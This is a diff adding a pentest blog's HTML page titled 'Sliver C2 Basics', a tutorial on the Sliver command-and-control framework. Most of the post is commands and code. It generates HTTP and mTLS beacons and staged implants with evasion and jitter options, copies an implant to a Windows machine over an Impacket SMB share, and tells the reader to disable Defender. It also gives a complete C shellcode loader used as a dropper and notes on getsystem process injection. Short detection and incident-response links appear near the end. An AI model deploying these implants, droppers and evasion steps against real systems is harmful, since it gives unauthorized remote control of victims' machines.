@@ -1,0 +1,855 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Sliver C2 |</title>
+<meta name="description" content="Starting with Sliver C2 ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="Sliver C2">
+<meta property="og:url" content="http://localhost:4000/c2/sliverbasics/">
+
+
+  <meta property="og:description" content="Starting with Sliver C2 ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header3.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-04-11T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/c2/sliverbasics/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header3.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          Sliver C2
+
+        
+      </h1>
+      
+        <p class="page__lead">Starting with Sliver C2
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/" class="active">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Sliver C2">
+    <meta itemprop="description" content="Starting with Sliver C2">
+    <meta itemprop="datePublished" content="2024-04-11T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <h1 id="sliver">SLIVER</h1>
+
+<p><img src="/assets/images/posts/c2/c2-teaser.jpg" alt="Alt text" width="500" class="align-center" /></p>
+
+<h2 id="doc">DOC</h2>
+
+<p>https://sliver.sh/</p>
+
+<p>https://github.com/BishopFox/sliver</p>
+
+<h2 id="installation">Installation</h2>
+<p>curl https://sliver.sh/install|sudo bash</p>
+
+<p>u can start the server with systemctl</p>
+
+<p>run:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver
+</code></pre></div></div>
+
+<h2 id="types-of-implants">Types of implants</h2>
+
+<ul>
+  <li>Beacons = will check in with your Server from time to time to see if u wrote some command to be executed</li>
+  <li>Session = its real time response, similar to a reverse shell</li>
+</ul>
+
+<blockquote>
+  <p>Similar but not the same. Shell is even easier to detect</p>
+</blockquote>
+
+<p>Generating the Beacon:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>generate beacon --http &lt;C2 IP&gt; --save .
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/1.png" alt="Alt text" class="align-center" /></p>
+
+<p>After that, u can run SMB SERVER using IMPACKET to transfer it to the remote Windows Machine</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py kali . -smb2support -username anon -password anon
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/2.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>On Windows</strong></p>
+
+<p>Connect:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\&lt;C2 ip&gt;\kali /USER:anon anon
+</code></pre></div></div>
+
+<p>Copy the File:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\&lt;C2 ip&gt;\kali\&lt;beacon.exe&gt; .
+</code></pre></div></div>
+<p><img src="/assets/images/posts/c2/3.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/c2/4.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>Bypass in necessary if the AV/EDR are enable (So, for now just disable Defender)</p>
+</blockquote>
+
+<blockquote>
+  <p>I’ll write about evasion in future posts and How to use staged payloads in Sliver</p>
+</blockquote>
+
+<h2 id="listener">Listener</h2>
+
+<ul>
+  <li>http/https - for communication over the HTTP(S) protocol, pretty standard across any C2</li>
+  <li>mtls - communication using mutual-TLS, a protocol in which both the implant and the server present a certificate that the other must validate. If one certificate fails, the connection does not happen.</li>
+  <li>wg - communication using WireGuard, which essentially creates a lightweight VPN to communicate over.</li>
+  <li>dns -This is all UDP and its not recommended for beginners.</li>
+</ul>
+
+<blockquote>
+  <p>Since our beacon was only configured to have an http callback, we can run http in our shell and then execute the beacon on the remote Windows computer.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver &gt; http
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/5.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="beacons">Beacons</h2>
+
+<p>To see the open beacons just type:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver &gt; beacons 
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/6.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>As we did a Beacon instead of a Session, the beacon will check every now and then.</li>
+  <li>Sliver also has <strong>Jitter</strong>, which will make the checks a little irregular so will be less suspicious</li>
+</ul>
+
+<p>To interact:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use &lt;beacon ID&gt;
+#beacons rm = to delete beacons
+#beacons -k &lt;ID or -K = to kill beacons
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/7.png" alt="Alt text" class="align-center" /></p>
+
+<p>You’ll notice that it will take a time to SLIVER get the result because of the check in time</p>
+
+<p><img src="/assets/images/posts/c2/8.png" alt="Alt text" class="align-center" /></p>
+
+<p>To show commands executed before:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasks
+
+tasks fetch &lt;ID&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/9.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="sessions">sessions</h2>
+
+<p>U can change from beacon to session, but not vice-versa:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interactive
+use &lt;ID&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions
+
+sessions -K = to kill all sessions
+sessions -k = (lowercase) to kill specific sessions
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/10.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="profiles">PROFILES</h2>
+<p>Save Profile:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles new beacon --arch amd64 --os windows --mtls &lt;C2 IP&gt;:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 profile_name
+</code></pre></div></div>
+
+<p>Generate the beacon:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles generate --save . profile_name
+</code></pre></div></div>
+
+<blockquote>
+  <p>You can also generate session implants in the same way, just omit the beacon part.</p>
+</blockquote>
+
+<p>To show the Profiles:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles
+</code></pre></div></div>
+
+<p>To show the Implants:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>implants
+</code></pre></div></div>
+
+<p>If u need to recover a deleted implant:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regenerate &lt;name of implant&gt;
+</code></pre></div></div>
+
+<h2 id="post-exploitation">Post-Exploitation</h2>
+
+<h3 id="staging">Staging</h3>
+
+<ul>
+  <li>Stegeless = one single binary that connects back to u</li>
+  <li>Staged = Dropper, its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.</li>
+</ul>
+
+<p>Create the Profile:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles new beacon --arch amd64 --os windows --mtls &lt;C2 IP&gt;:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 profile_name
+</code></pre></div></div>
+
+<p>Create the Listener to the initial Callback:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stage-listener --url http://&lt;C2 IP&gt;:8080 --profile profile_name --prepend-size
+</code></pre></div></div>
+
+<blockquote>
+  <p>–prepend-size if you are going to use some as Metasploit/msfvenom stager
+Dont use the flag if you are going to write your own stager</p>
+</blockquote>
+
+<p>Start the second Listener to get the second callback:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtls --lhost &lt;C2 IP&gt; --lport 443
+</code></pre></div></div>
+
+<p>Generate the Stager:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>generate stager -r http --lhost &lt;C2 IP&gt; --lport 8080
+</code></pre></div></div>
+
+<p>Example of Dropper in C:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="c1">// Define your shellcode here</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// Your shellcode goes here</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">LPVOID</span> <span class="n">lpAlloc</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
+
+    <span class="c1">// Allocate memory</span>
+    <span class="n">lpAlloc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">lpAlloc</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Copy shellcode to allocated memory</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+
+    <span class="c1">// Change memory protection</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualProtect failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Create a new thread to execute shellcode</span>
+    <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateThread failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Wait for the thread to finish</span>
+    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+
+    <span class="c1">// Clean up</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="n">VirtualFree</span><span class="p">(</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>Run the Dropper to get a callback in your C2</p>
+</blockquote>
+
+<h2 id="armory">Armory</h2>
+
+<p>Its the Extension Package Manager of Sliver which allows us to install tools that other people made</p>
+
+<p>To show the packages available:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armory
+</code></pre></div></div>
+
+<p>To install a pack:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armory install seatbelt
+</code></pre></div></div>
+
+<p>Execute:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armory -i -- -group=system
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/c2/11.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="bof-beacon-object-files">BOF: Beacon Object Files</h2>
+
+<p>https://sliver.sh/docs?name=BOF+and+COFF+Support</p>
+
+<h2 id="detection">Detection</h2>
+
+<ul>
+  <li>https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/</li>
+  <li>https://www.youtube.com/watch?v=izMMmOaLn9g</li>
+</ul>
+
+<h3 id="shell">Shell</h3>
+
+<p>remember the Session is in the currently running process, but the shell is different. Its easier to detect as we see in Windows Event:</p>
+
+<h3 id="psexec--getsystem">psexec &amp; getsystem</h3>
+
+<blockquote>
+  <p>psexec works similar to impacket, it will run a binary from <strong>C:\Windows\Temp</strong> and give a random 10 char name</p>
+</blockquote>
+
+<blockquote>
+  <p>getsystem is a macro that try to inject itself into another process <strong>spoolsv.exe</strong> (default) and abusing SeDebugPrivilege to get NT AUTHORITY\SYSTEM within that process (similar to meterpreter)</p>
+</blockquote>
+
+<h2 id="config-extraction-ir">Config Extraction (IR)</h2>
+
+<p>The key is to extract the config that is stored in the implant</p>
+
+<p>https://www.youtube.com/watch?v=FiT7-zxQGbo</p>
+
+<ul>
+  <li>
+    <p>Most C2s will encrypt their config and obfuscate the code</p>
+  </li>
+  <li>
+    <p>So the config has to be descrypted in-memory and then used</p>
+  </li>
+</ul>
+
+<h2 id="references">References</h2>
+
+<p>https://tishina.in/opsec/sliver-opsec-notes</p>
+
+<p>https://dominicbreuker.com/post/learning_sliver_c2_01_installation/#series-overview</p>
+
+<p>https://notateamserver.xyz/sliver-101/</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#c2" class="page__taxonomy-item" rel="tag">c2</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sliver" class="page__taxonomy-item" rel="tag">sliver</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#c2" class="page__taxonomy-item" rel="tag">c2</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-04-11T00:00:00+06:00">April 11, 2024</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Sliver+C2%20http%3A%2F%2Flocalhost%3A4000%2Fc2%2Fsliverbasics%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fc2%2Fsliverbasics%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fc2%2Fsliverbasics%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/cve/xss/" class="pagination--pager" title="Stored cross-site scripting (XSS)
+">Previous</a>
+    
+    
+      <a href="/maldev/maldev/" class="pagination--pager" title="MALDEV
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
